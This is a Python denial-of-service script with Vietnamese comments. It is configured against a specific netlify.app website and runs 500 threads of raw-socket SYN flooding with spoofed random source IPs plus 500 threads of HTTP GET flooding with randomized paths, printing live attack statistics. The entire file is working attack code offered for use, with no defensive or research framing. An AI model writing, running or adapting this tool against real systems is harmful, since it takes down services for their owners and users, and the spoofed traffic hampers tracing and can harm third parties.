import socket
import threading
import random
import time
import sys
import struct
import urllib.parse

# ========== CẤU HÌNH ==========
TARGET_URL = "https://whstudio.netlify.app"   # URL mục tiêu
THREAD_SYN = 500                       # Số luồng SYN flood
THREAD_HTTP = 500                      # Số luồng HTTP flood
DURATION = 30                          # Giây
SYN_FLOOD = True                       # Bật SYN flood (cần root)
HTTP_FLOOD = True                      # Bật HTTP flood

# Biến toàn cục
running = True
stats_lock = threading.Lock()
syn_packets = 0
http_requests = 0

def checksum(data):
    """Tính checksum TCP/IP"""
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + (data[i+1] if i+1 < len(data) else 0)
        s += w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def create_syn_packet(source_ip, dest_ip, dest_port, source_port):
    """Tạo gói tin TCP SYN với IP giả mạo"""
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 40
    ip_id = random.randint(1, 65535)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_saddr = socket.inet_aton(source_ip)
    ip_daddr = socket.inet_aton(dest_ip)
    
    ip_header = struct.pack('!BBHHHBBH4s4s',
        (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
        ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
        ip_saddr, ip_daddr)
    
    tcp_seq = random.randint(0, 4294967295)
    tcp_ack_seq = 0
    tcp_doff = 5
    tcp_flags = 0x02
    tcp_window = socket.htons(5840)
    tcp_check = 0
    tcp_urg_ptr = 0
    
    tcp_header = struct.pack('!HHLLBBHHH',
        source_port, dest_port, tcp_seq, tcp_ack_seq,
        (tcp_doff << 4) + 0, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
    
    source_address = socket.inet_aton(source_ip)
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)
    
    psh = struct.pack('!4s4sBBH',
        source_address, dest_address, placeholder, protocol, tcp_length)
    psh = psh + tcp_header
    tcp_check = checksum(psh)
    
    tcp_header = struct.pack('!HHLLBBHHH',
        source_port, dest_port, tcp_seq, tcp_ack_seq,
        (tcp_doff << 4) + 0, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
    
    return ip_header + tcp_header

def syn_flood(target_ip, target_port):
    global syn_packets, running
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("[-] Cần quyền root. Chạy: sudo python3 ddos_real.py")
        return
    except:
        return
    
    while running:
        source_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        source_port = random.randint(1024, 65535)
        packet = create_syn_packet(source_ip, target_ip, target_port, source_port)
        try:
            sock.sendto(packet, (target_ip, 0))
            with stats_lock:
                syn_packets += 1
        except:
            pass

def http_flood(target_ip, target_port, host, path="/"):
    global http_requests, running
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect((target_ip, target_port))
            
            random_path = f"/{random.randint(1,9999999)}?{random.randint(1,999999)}"
            request = f"GET {random_path} HTTP/1.1\r\n"
            request += f"Host: {host}\r\n"
            request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
            request += "Accept: */*\r\n"
            request += "Connection: close\r\n\r\n"
            
            sock.send(request.encode())
            try:
                sock.recv(1024)
            except:
                pass
            sock.close()
            
            with stats_lock:
                http_requests += 1
        except:
            pass

def show_stats():
    global running, syn_packets, http_requests
    start = time.time()
    last_syn = 0
    last_http = 0
    
    print("\n" + "="*60)
    print(f"Đang tấn công: {TARGET_URL}")
    print(f"Thời gian: {DURATION} giây")
    if SYN_FLOOD: print(f"SYN flood: {THREAD_SYN} luồng (gói giả mạo)")
    if HTTP_FLOOD: print(f"HTTP flood: {THREAD_HTTP} luồng (kết nối thực)")
    print("="*60)
    print("Thời gian | SYN gửi | SYN/s | HTTP req | HTTP/s")
    print("-"*60)
    
    while running:
        time.sleep(1)
        elapsed = int(time.time() - start)
        with stats_lock:
            s = syn_packets
            h = http_requests
        s_rate = s - last_syn
        h_rate = h - last_http
        last_syn, last_http = s, h
        print(f"{elapsed:>5}s   | {s:>8} | {s_rate:>5} | {h:>9} | {h_rate:>6}")
        if elapsed >= DURATION:
            running = False
            break
    
    print("-"*60)
    print(f"TỔNG KẾT: SYN={syn_packets} gói | HTTP={http_requests} request")

def main():
    parsed = urllib.parse.urlparse(TARGET_URL)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    
    try:
        target_ip = socket.gethostbyname(host)
    except:
        print("[-] Không phân giải được hostname")
        sys.exit(1)
    
    print(f"[+] Mục tiêu: {host} -> {target_ip}:{port}")
    
    threads = []
    
    if SYN_FLOOD:
        print("[+] Khởi tạo SYN flood...")
        for _ in range(THREAD_SYN):
            t = threading.Thread(target=syn_flood, args=(target_ip, port))
            t.daemon = True
            t.start()
            threads.append(t)
    
    if HTTP_FLOOD:
        print("[+] Khởi tạo HTTP flood...")
        for _ in range(THREAD_HTTP):
            t = threading.Thread(target=http_flood, args=(target_ip, port, host, path))
            t.daemon = True
            t.start()
            threads.append(t)
    
    show_stats()
    print("\n[+] Kết thúc.")

if __name__ == "__main__":
    if SYN_FLOOD and sys.platform != "linux":
        print("[-] SYN flood chỉ hoạt động tốt trên Linux.")
    main()
